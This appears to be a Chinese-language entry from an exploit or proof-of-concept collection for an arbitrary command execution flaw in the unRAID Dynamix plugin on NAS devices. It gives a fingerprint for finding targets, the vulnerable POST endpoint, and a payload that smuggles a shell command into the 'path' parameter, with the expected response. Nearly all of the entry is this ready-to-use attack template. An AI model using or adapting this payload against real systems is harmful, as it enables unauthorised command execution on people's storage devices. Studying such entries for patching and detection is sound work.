# NAS设备unraidDynamix插件任意命令执行漏洞

NAS ｜ 命令执行 ｜ —
- **指纹**：`"/webGui/images/banner.png"`
- **请求**：`POST /plugins/dynamix/include/FileSystemStatus.php HTTP/1.1`

**Payload**
```
csrf_token=9855BE5478D13A31&cmd=scrub&path=echo dudesite >dudesite.txt
```
- **响应特征**：200